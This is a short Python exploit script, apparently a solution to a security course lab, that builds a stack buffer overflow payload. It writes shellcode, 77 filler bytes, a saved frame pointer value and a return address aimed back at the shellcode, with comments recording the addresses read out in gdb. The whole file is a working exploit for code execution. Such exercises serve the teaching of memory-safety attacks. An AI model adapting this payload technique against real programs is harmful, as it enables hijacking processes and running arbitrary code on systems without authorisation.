#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here

# Overflow the buffer with non-null bytes otherwise shell script will break:
#  bash: warning: command substitution: ignored null byte in input
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(("\x01" * 77).encode())

# What are the current values of the saved frame pointer and return address from the stack
# frame? You can examine two words of memory at %ebp using: (gdb) x/2wx $ebp
#
# (gdb) x/2wx $ebp
# 0xfffe9644:     0xfffe9650      0x080488f2
#
# Base Pointer (is ok to overwrite with garbage)
sys.stdout.buffer.write(pack("<I", 0xfffe9650))

# Overwrite return address to start of shellcode
sys.stdout.buffer.write(pack("<I", 0xfffe95e0))